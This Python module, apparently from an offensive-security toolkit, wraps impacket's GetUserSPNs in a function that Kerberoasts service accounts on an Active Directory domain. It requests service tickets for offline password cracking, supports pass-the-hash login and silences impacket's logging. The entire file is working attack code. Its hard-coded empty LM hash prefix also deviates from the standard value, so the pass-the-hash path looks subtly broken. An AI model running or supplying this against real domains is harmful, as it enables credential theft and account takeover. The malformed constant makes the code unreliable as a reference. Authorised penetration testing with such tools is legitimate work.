from pympacket.attacks.GetUserSPNs import GetUserSPNs
from argparse import Namespace
import logging
import sys

def kerberoast(username, domain, dc_ip, password='', nthash=None):
    """Uses impacket's 'GetUserSPNs' to kerberoast existing Service Accounts on the domain"""
    # This script is meant to be executed against the current domain
    user_domain = domain
    target_domain = domain

    # If Pass-The-Hash is used, prepend an empty LM hash before the provided NT one for impacket to successfully authenticate
    if nthash is not None:
        nthash = f'aad3c435b514a4eeaad3b935b51304fe:{nthash}'

    logging.disable(sys.maxsize) #Disable impacket logger

    # Build parameter namespace to pass to GetUserSPNs
    cmdLineOptions = Namespace(
        no_preauth=None,
        outputfile=None,
        usersfile=None,
        aesKey=None,
        k=False,
        request=True, # Always request the tgs from the targeted accounts
        dc_ip=dc_ip,
        dc_host=None,
        save=False,
        request_user=None,
        stealth=False,
        hashes=nthash
    )

    # Runs the actual kerberoasting attack from impacket, returns a list of 'User' classes
    krbroasting = GetUserSPNs(username, password, user_domain, target_domain, cmdLineOptions=cmdLineOptions)
    return krbroasting.run()
